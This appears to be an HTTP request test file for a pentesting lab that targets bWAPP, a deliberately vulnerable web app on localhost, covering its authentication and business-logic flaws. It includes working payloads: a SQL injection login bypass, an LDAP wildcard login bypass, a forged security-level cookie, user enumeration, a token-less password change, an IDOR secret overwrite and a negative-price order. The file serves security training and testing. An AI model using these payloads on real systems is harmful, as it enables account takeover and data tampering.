### ============================================================================
### 06 - A7 Identification and Authentication Failures
###         A2 Cryptographic Failures
###         A4 Insecure Design (business logic)
###
###   bWAPP ships four deliberately broken login pages, a password-reset oracle,
###   a session model with no authorization, and object references that trust
###   client-supplied identifiers.
### ============================================================================

### ---------------------------------------------------------------------------
### AUTH-01  Hardcoded / default credentials
###   These are the documented bWAPP defaults AND they are published
###   unauthenticated on /admin/ (see 08-info-disclosure.http INFO-01), so
###   there is nothing to brute force - just read them.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/login.php HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

login=bee&password=bug&security_level=0&form=submit
### Expected: 302 -> index.php, valid session, "Welcome Bee"


### ---------------------------------------------------------------------------
### AUTH-02  Broken login #1 - classic SQLi auth bypass
###   ba_insecure_login_1.php concatenates both fields into the query.
###   The '#' comments out the password half of the WHERE clause.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/ba_insecure_login_1.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

login=admin%27%20OR%20%271%27%3D%271%27%20%23&password=anything&form=submit
### Expected: 200, "Welcome ..." in the menu - authenticated as the first account


### ---------------------------------------------------------------------------
### AUTH-03  Broken login #2 - the password is not checked server-side at all
###   Any password is accepted as long as the username exists. Note the
###   response is much larger than a normal login page: this variant also
###   renders the matched user's record.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/ba_insecure_login_2.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

login=bee&password=totally-wrong-password&form=submit
### Expected: 200, login SUCCEEDS despite the wrong password


### ---------------------------------------------------------------------------
### AUTH-04  Broken login #3 - loose/weak password comparison
### ---------------------------------------------------------------------------
POST {{baseUrl}}/ba_insecure_login_3.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

login=bee&password=bug&form=submit
### Expected: 200, authenticated


### ---------------------------------------------------------------------------
### AUTH-05  User enumeration via the forgotten-password oracle
###   Two requests, different wording in the response. Automation can turn
###   this into a reliable account list before any password attack.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/ba_forgotten.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

login=A.I.M.&form=submit
### Expected: 200, "the E-Mail ... is sent" - account EXISTS
###
### AUTH-15  Negative control - the same endpoint for an account that does not exist
POST {{baseUrl}}/ba_forgotten.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

login=no-such-user-xyz&form=submit
### Expected: 200, different wording ("invalid" / "not found") - account absent


### ---------------------------------------------------------------------------
### AUTH-06  Weak password policy - trivial passwords are accepted
###   The policy check is advisory only; the change still succeeds.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/ba_weak_pwd.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

login=bee&password=1&form=submit
### Expected: 200, the password is changed to "1" without objection


### ---------------------------------------------------------------------------
### AUTH-07  Password change with no CSRF token and no old-password check
###   Also part one of the CSRF chain in 07-csrf-clickjacking-cors.http.
###   WARNING: this rewrites the bee account's password for the whole lab.
###   Reset it afterwards with AUTH-08.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/csrf_1.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

password=pwned&password_conf=pwned&form=submit
### Expected: 200, password changed; no token was required


### ---------------------------------------------------------------------------
### AUTH-08  Restore the lab password after AUTH-07
### ---------------------------------------------------------------------------
POST {{baseUrl}}/password_change.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

password=bug&password_conf=bug&form=submit
### Expected: 200, password restored to "bug"


### ---------------------------------------------------------------------------
### AUTH-09  No authorization on the secret endpoint
###   secret.php is served to any valid session and returns the raw secret in
###   text/plain - no admin check, no ownership check, no rate limit.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/secret.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200 text/plain "Your secret: <value>"


### ---------------------------------------------------------------------------
### AUTH-10  IDOR - overwrite ANOTHER user's secret
###   insecure_direct_object_ref_1.php takes the target account from a
###   `login` field instead of the session. No token is required at level 0.
###   Verify with AUTH-09 while logged in as the admin account.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/insecure_direct_object_ref_1.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

login=A.I.M.&secret=pwned-by-idor&action=change
### Expected: 200, success message; A.I.M.'s secret is now "pwned-by-idor"


### ---------------------------------------------------------------------------
### AUTH-11  LDAP injection - wildcard auth bypass
###   ldap_connect.php builds an LDAP filter by concatenation. "*" matches
###   every entry, so both the user and password filters are satisfied.
###   Works even without the wildcard password because the filter is
###   (uid=*)(password=*) style - i.e. the server is queried anonymously.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/ldap_connect.php HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
Content-Type: application/x-www-form-urlencoded

login=*&password=*&form=submit
### Expected: 200, "Welcome ..." - authenticated, no valid credentials used


### ---------------------------------------------------------------------------
### AUTH-12  Business logic - negative ticket price
###   insecure_direct_object_ref_2.php multiplies quantity by price with no
###   server-side bound. A negative price produces a negative total, i.e. the
###   attacker is paid to buy.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/insecure_direct_object_ref_2.php?ticket_quantity=2&ticket_price=-100&action=go HTTP/1.1
Host: localhost:8080
Cookie: {{authCookie}}
### Expected: 200, ticket total shows a negative amount


### ---------------------------------------------------------------------------
### AUTH-13  Session management - the security level is a client-controlled cookie
###   Re-send SQLI-01 from 01-sqli.http but claim security_level=2 (the
###   "hardened" setting). The injection still works, because the app trusts
###   whatever the client sends. This is the single most important
###   architectural flaw in bWAPP: the security control is client-side only.
### ---------------------------------------------------------------------------
GET {{baseUrl}}/sqli_1.php?title=%27%20OR%201%3D1--%20-&action=go HTTP/1.1
Host: localhost:8080
Cookie: PHPSESSID={{session}}; security_level=2
### Expected: 200, all 9 movies - SQLi succeeds while the app believes it is
###           running at the "high" security level


### ---------------------------------------------------------------------------
### AUTH-14  Session id accepted from the client (fixation surface)
###   bWAPP's session cookie is a plain PHPSESSID with no Secure, HttpOnly or
###   SameSite attributes. The request below shows the Set-Cookie bWAPP issues;
###   compare the attributes with your own policy baseline.
### ---------------------------------------------------------------------------
POST {{baseUrl}}/login.php HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

login=bee&password=bug&security_level=0&form=submit
### Expected: Set-Cookie: PHPSESSID=...; path=/     <- no HttpOnly, no Secure, no SameSite
